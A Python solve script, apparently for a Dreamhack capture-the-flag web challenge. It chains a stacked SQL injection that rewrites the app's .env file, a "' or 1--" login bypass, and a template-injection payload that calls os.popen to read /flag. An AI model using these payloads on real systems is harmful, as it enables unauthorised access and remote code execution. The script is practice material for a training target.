import requests
import re

url = 'http://host8.dreamhack.games:12940/'
s = requests.Session()

# sqli 
res = s.post(f'{url}/api/register', json={
    "username": "a', 'a', 'a'); ATTACH DATABASE '.env' AS evil; CREATE TABLE evil.pwn(data text); INSERT INTO evil.pwn VALUES('MIDDLEWARE=false'); --",
    "password": "a",
    "email": "a"
})

res = s.post(f'{url}/api/login', json={
    'username': "' or 1--",
    'password': 'a'
})

assert 'admin' in res.text
print("> Logged in as admin")

# ssti
cmd = 'cat /flag'

payload = "self.__init__.__globals__.__builtins__['__import__']('os').popen('%s').read()" % cmd

res = s.get(f'{url}/memo', params={
    'memo': '{{ %s }}' % payload
})

flag = re.findall(r'(DH{.+?})', res.text)[0].strip()
print("Flag:", flag)